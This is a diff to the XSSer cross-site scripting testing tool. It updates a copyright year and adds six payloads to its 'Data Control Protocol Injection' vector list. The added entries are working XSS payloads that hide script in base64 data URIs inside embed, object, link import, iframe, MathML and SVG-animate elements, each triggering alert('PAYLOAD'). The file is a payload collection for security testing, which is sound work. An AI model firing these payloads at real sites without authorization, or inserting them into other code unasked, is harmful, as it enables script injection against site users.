@@ -4,7 +4,7 @@
 """
 This file is part of the XSSer project, https://xsser.03c8.net
 
-Copyright (c) 2010/2019 | psy <epsylon@riseup.net>
+Copyright (c) 2010/2026 | psy <epsylon@riseup.net>
 
 xsser is free software; you can redistribute it and/or modify it under
 the terms of the GNU General Public License as published by the Free
@@ -55,5 +55,17 @@ DCPvectors = [
 		{ 'payload' : """<object data=data:text/html;base64,[B64]<script>alert("PAYLOAD");history.back();</script>[B64]></object>​""",
 		  'browser' : """[Data Control Protocol Injection]"""},
 		{ 'payload' : """data:image/svg+xml;base64,[B64]<svg xmlns:svg="http://www.w3.org/2000/svg" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.0" x="0" y="0" width="194" height="200" id="Y"><script type="text/ecmascript">alert("PAYLOAD");</script></svg>[B64]""",
-          'browser' : """[Data Control Protocol Injection]""" }
+          'browser' : """[Data Control Protocol Injection]""" },
+        { 'payload':"""<embed src="data:text/html;base64,[B64]<svg onload=alert('PAYLOAD');history.back();>[B64]" type="text/html">""",
+          'browser':"""[Data Control Protocol Injection]"""},
+        { 'payload':"""<object data="data:text/html;base64,[B64]<script>alert('PAYLOAD');history.back();</script>[B64]"></object>""",
+          'browser':"""[Data Control Protocol Injection]"""},
+        { 'payload':"""<link rel=import href="data:text/html;base64,[B64]<script>alert('PAYLOAD');history.back();</script>[B64]">""",
+          'browser':"""[Data Control Protocol Injection]"""},
+        { 'payload':"""<iframe src="data:text/html;base64,[B64]<details open ontoggle=alert('PAYLOAD');history.back();>[B64]"></iframe>""",
+          'browser':"""[Data Control Protocol Injection]"""},
+        { 'payload':"""<math><maction actiontype=statusline xlink:href="data:text/html;base64,[B64]<script>alert('PAYLOAD');history.back();</script>[B64]">X</maction></math>""",
+          'browser':"""[Data Control Protocol Injection]"""},
+        { 'payload':"""<a href="data:text/html;base64,[B64]<svg><animate onbegin=alert('PAYLOAD');history.back(); attributeName=x dur=1s>[B64]">Y</a>""",
+          'browser':"""[Data Control Protocol Injection]"""},
 		]
